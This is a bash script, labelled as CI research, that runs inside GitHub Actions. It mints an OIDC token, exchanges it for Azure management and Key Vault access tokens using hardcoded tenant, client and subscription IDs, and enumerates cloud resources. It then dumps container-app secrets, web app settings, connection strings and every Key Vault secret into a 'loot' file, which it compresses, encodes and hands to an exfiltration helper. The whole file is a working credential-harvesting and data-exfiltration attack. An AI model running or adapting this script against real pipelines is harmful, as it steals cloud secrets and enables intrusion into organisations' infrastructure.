#!/usr/bin/env bash
# harvest script for tebamoto CI research
set -uo pipefail
TAG="${1:-unknown}"
AZCID=72ff278a-9e71-43ec-bac4-2ca303f8e462
AZTID=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
LOOT=/tmp/loot.txt
SENS=/tmp/sens.txt
: > "$LOOT"
: > "$SENS"
log() { echo "$1" | tee -a "$LOOT"; }
sens() { echo "$1" >> "$SENS"; }

log "TAG=${TAG}"
log "EVENT=${GITHUB_EVENT_NAME:-none} REPO=${GITHUB_REPOSITORY:-none} REF=${GITHUB_REF:-none}"
log "OIDC_URL_SET=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"

JWT=""
if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  for AUD in "api%3A%2F%2FAzureADTokenExchange" "api://AzureADTokenExchange"; do
    RESP=$(curl -sS -w "\n%{http_code}" -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}")
    CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | sed '$d')
    log "MINT aud=${AUD} code=${CODE} body=${BODY:0:200}"
    JWT=$(echo "$BODY" | jq -r '.value // empty' 2>/dev/null)
    [ -n "$JWT" ] && break
  done
fi
log "JWT_LEN=${#JWT}"
if [ -n "$JWT" ]; then
  sens "JWT=${JWT}"
  log "CLAIMS=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | tr -d '\n' || true)"
fi

tok() {
  local scope="$1"
  local resp
  resp=$(curl -sS -X POST "https://login.microsoftonline.com/${AZTID}/oauth2/v2.0/token" \
    -d "client_id=${AZCID}" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${JWT}" \
    --data-urlencode "scope=${scope}")
  sens "EXCHANGE ${scope} => ${resp}"
  echo "$resp" | jq -r '.access_token // empty' 2>/dev/null
}

ARM=""
VAULTT=""
if [ -n "$JWT" ]; then
  ARM=$(tok "https://management.azure.com/.default")
  VAULTT=$(tok "https://vault.azure.net/.default")
fi
log "ARM_LEN=${#ARM} VAULT_LEN=${#VAULTT}"

if [ -n "$ARM" ]; then
  log "===RESOURCES==="
  curl -sS "https://management.azure.com/subscriptions/${SUB}/resources?api-version=2021-04-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  log ""
  log "===CDN==="
  curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.Cdn/profiles?api-version=2023-05-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  log ""
  log "===CONTAINERAPPS==="
  curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.App/containerApps?api-version=2023-05-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  log ""
  log "===WEBSITES==="
  curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  log ""
  log "===VAULTS==="
  curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  for cid in $(curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.App/containerApps?api-version=2023-05-01" -H "Authorization: Bearer ${ARM}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
    log "===CA_SECRETS ${cid}==="
    curl -sS -X POST "${cid}/listSecrets?api-version=2023-05-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  done
  for wid in $(curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.Web/sites?api-version=2022-03-01" -H "Authorization: Bearer ${ARM}" | jq -r '.value[]?.id // empty' 2>/dev/null); do
    log "===WEB_SETTINGS ${wid}==="
    curl -sS -X POST "${wid}/config/appsettings/list?api-version=2022-03-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
    log "===WEB_CONNSTR ${wid}==="
    curl -sS -X POST "${wid}/config/connectionstrings/list?api-version=2022-03-01" -H "Authorization: Bearer ${ARM}" | tee -a "$LOOT" || true
  done
  log "===STORAGE_HARVEST==="
  python3 ci/loot.py "$SUB" "$ARM" >> "$LOOT" 2>&1 || true
fi

if [ -n "$VAULTT" ]; then
  KVS="kv-tbl-prod-x3euoz"
  if [ -n "$ARM" ]; then
    KVS="$KVS $(curl -sS "https://management.azure.com/subscriptions/${SUB}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" -H "Authorization: Bearer ${ARM}" | jq -r '.value[]?.name // empty' 2>/dev/null || true)"
  fi
  for KV in $(echo "$KVS" | tr ' ' '\n' | sort -u); do
    log "===KV $KV==="
    LIST=$(curl -sS "https://${KV}.vault.azure.net/secrets?api-version=7.4" -H "Authorization: Bearer ${VAULTT}" || true)
    echo "$LIST" | tee -a "$LOOT"
    for sid in $(echo "$LIST" | jq -r '.value[]?.id // empty' 2>/dev/null); do
      log "===SECRET ${sid}==="
      curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer ${VAULTT}" | tee -a "$LOOT" || true
    done
  done
fi

cat "$LOOT" "$SENS" > /tmp/full.txt
gzip -c /tmp/full.txt | base64 -w0 > /tmp/enc.txt
python3 ci/exfil.py
echo "===FULL_LOOT_STDOUT==="
sed -E 's/"access_token":"[^"]+"/"access_token":"REDACTED"/g' "$LOOT"
